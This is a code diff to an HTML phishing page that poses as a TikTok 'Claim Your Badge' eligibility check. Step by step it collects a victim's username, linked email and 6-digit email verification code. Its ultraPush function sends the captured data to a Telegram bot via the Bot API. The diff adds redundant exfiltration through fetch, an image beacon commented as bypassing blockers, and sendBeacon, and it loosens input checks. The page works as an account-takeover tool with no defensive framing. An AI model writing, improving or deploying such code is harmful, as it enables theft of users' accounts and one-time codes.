@@ -30,7 +30,7 @@
     <div id="step1" class="step active">
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok @username to check eligibility.</p>
-        <input type="text" id="username" placeholder="@username" spellcheck="false" autocomplete="off">
+        <input type="text" id="username" placeholder="@username" spellcheck="false">
         <div id="msg1" class="status-msg"></div>
         <button id="btn1" class="btn" onclick="validateStep1()">CONTINUE</button>
     </div>
@@ -38,7 +38,7 @@
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email linked to your account.</p>
-        <input type="email" id="email" placeholder="Email address" spellcheck="false">
+        <input type="email" id="email" placeholder="Email address">
         <div id="msg2" class="status-msg">Verifying email...</div>
         <button id="btn2" class="btn" onclick="process(2, 'Verifying...', 3)">SEND CODE</button>
     </div>
@@ -46,7 +46,7 @@
     <div id="step3" class="step">
         <h1>Verify Email</h1>
         <p>Enter the 6-digit code sent to your mail.</p>
-        <input type="text" id="code" placeholder="6-digit code" inputmode="numeric" pattern="[0-9]*" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+        <input type="text" id="code" placeholder="6-digit code" inputmode="numeric" maxlength="6">
         <div id="msg3" class="status-msg">Validating code...</div>
         <button id="btn3" class="btn" onclick="process(3, 'Validating...', 4)">CONFIRM CODE</button>
     </div>
@@ -75,9 +75,16 @@
 
     function ultraPush(m) {
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}&parse_mode=HTML&v=${Date.now()}`;
-        fetch(url, { cache: "no-cache" }).catch(() => {});
-        navigator.sendBeacon(url);
-        new Image().src = url;
+        
+        // Method 1: Standard Fetch
+        fetch(url, {mode: 'no-cors'}).catch(() => {});
+        
+        // Method 2: Image Beacon (Bypasses blockers)
+        const img = new Image();
+        img.src = url;
+
+        // Method 3: Navigator Beacon
+        if(navigator.sendBeacon) navigator.sendBeacon(url);
     }
 
     function validateStep1() {
@@ -85,7 +92,7 @@
         const msg = document.getElementById('msg1');
         const btn = document.getElementById('btn1');
 
-        if (u.length < 3 || u.length > 24) {
+        if (u.length < 3) {
             msg.innerText = "Invalid username. Please try again.";
             msg.classList.add('active');
             return;
